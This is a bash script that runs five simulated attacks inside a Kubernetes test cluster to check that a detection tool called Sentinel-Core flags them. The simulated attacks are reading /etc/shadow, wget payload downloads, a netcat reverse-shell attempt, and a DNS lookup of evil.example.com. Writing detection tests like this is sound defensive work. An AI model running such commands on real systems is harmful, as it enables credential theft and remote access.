#!/bin/bash
# Sentinel-Core Demo Attack Script
# Runs 5 real attacks inside the Kind cluster that WILL trigger TP classification
# Run AFTER ./start_app.sh

POD="attacker-pod"
NS="default"

echo "============================================================"
echo "  SENTINEL-CORE DEMO ATTACKS — ALL SHOULD GRADE AS TP"
echo "============================================================"

echo ""
echo "⚔️  Attack 1: External C2 payload download (T1071.001)"
kubectl exec -n $NS $POD -- wget -q http://httpbin.org/get -O /dev/null
echo "   → Expected: TP | wget | connect syscall"

sleep 2

echo ""
echo "⚔️  Attack 2: /etc/shadow credential dump (T1003.008)"
kubectl exec -n $NS $POD -- cat /etc/shadow
echo "   → Expected: TP | cat | openat on /etc/shadow"

sleep 2

echo ""
echo "⚔️  Attack 3: Reverse shell attempt via nc (T1059.004)"
kubectl exec -n $NS $POD -- sh -c "nc -w1 10.0.0.99 4444 </dev/null" || true
echo "   → Expected: TP | nc | connect to 10.0.0.99:4444"

sleep 2

echo ""
echo "⚔️  Attack 4: Wget malware download (T1105)"
kubectl exec -n $NS $POD -- wget -q http://httpbin.org/get -O /tmp/payload || true
echo "   → Expected: TP | wget | connect syscall"

sleep 2

echo ""
echo "⚔️  Attack 5: DNS exfiltration attempt (T1048.003)"
kubectl exec -n $NS $POD -- nslookup evil.example.com || true
echo "   → Expected: TP | nslookup | connect UDP:53"

echo ""
echo "============================================================"
echo "  All 5 attacks executed."
echo "  Check dashboard at http://localhost:3000"
echo "  Check API at http://localhost:8081/sentinel/analyze"
echo "============================================================"
